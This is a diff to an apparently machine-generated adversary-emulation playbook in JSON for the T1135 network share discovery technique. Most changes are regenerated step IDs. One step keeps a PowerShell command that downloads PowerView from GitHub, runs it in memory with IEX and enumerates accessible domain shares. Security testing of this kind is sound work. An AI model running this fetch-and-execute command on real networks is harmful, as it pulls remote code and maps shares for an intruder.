@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "54369faf-1d05-4d2e-9e3f-9e3273b34840",
+      "id": "fb3b7ec4-8cf5-429b-9e7d-d3919eabaf68",
       "type": "execute-command",
       "data": {
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "c90c8da8-6b79-4760-8a9f-2e00048ca96d",
+      "id": "32e80a06-eb60-4ef1-9d04-6c4e002fca0d",
       "name": "Check dependency 1/1",
       "description": "Endpoint must be joined to domain\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "92f755c5-7f01-4afd-b581-91262261a87e",
+      "id": "0ebb5320-0ee8-4d6e-9b40-f858d024976f",
       "name": "Resolve dependency 1/1",
       "description": "Endpoint must be joined to domain\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "3b73eaf0-809d-4768-8de1-0852993df5fa",
+      "id": "a447a6d5-0ce5-49da-873d-02098b362442",
       "name": "Re-check dependency 1/1",
       "description": "Endpoint must be joined to domain\n",
       "type": "execute-command",
@@ -51,27 +51,28 @@
   ],
   "flows": [
     {
-      "s": "c90c8da8-6b79-4760-8a9f-2e00048ca96d",
+      "s": "32e80a06-eb60-4ef1-9d04-6c4e002fca0d",
       "p": "on-success",
-      "o": "54369faf-1d05-4d2e-9e3f-9e3273b34840"
+      "o": "fb3b7ec4-8cf5-429b-9e7d-d3919eabaf68"
     },
     {
-      "s": "c90c8da8-6b79-4760-8a9f-2e00048ca96d",
+      "s": "32e80a06-eb60-4ef1-9d04-6c4e002fca0d",
       "p": "on-failure",
-      "o": "92f755c5-7f01-4afd-b581-91262261a87e"
+      "o": "0ebb5320-0ee8-4d6e-9b40-f858d024976f"
     },
     {
-      "s": "92f755c5-7f01-4afd-b581-91262261a87e",
+      "s": "0ebb5320-0ee8-4d6e-9b40-f858d024976f",
       "p": "on-success",
-      "o": "3b73eaf0-809d-4768-8de1-0852993df5fa"
+      "o": "a447a6d5-0ce5-49da-873d-02098b362442"
     },
     {
-      "s": "3b73eaf0-809d-4768-8de1-0852993df5fa",
+      "s": "a447a6d5-0ce5-49da-873d-02098b362442",
       "p": "on-failure",
-      "o": "54369faf-1d05-4d2e-9e3f-9e3273b34840"
+      "o": "fb3b7ec4-8cf5-429b-9e7d-d3919eabaf68"
     }
   ],
   "tags": [
     "T1135"
-  ]
+  ],
+  "input_arguments": null
 }
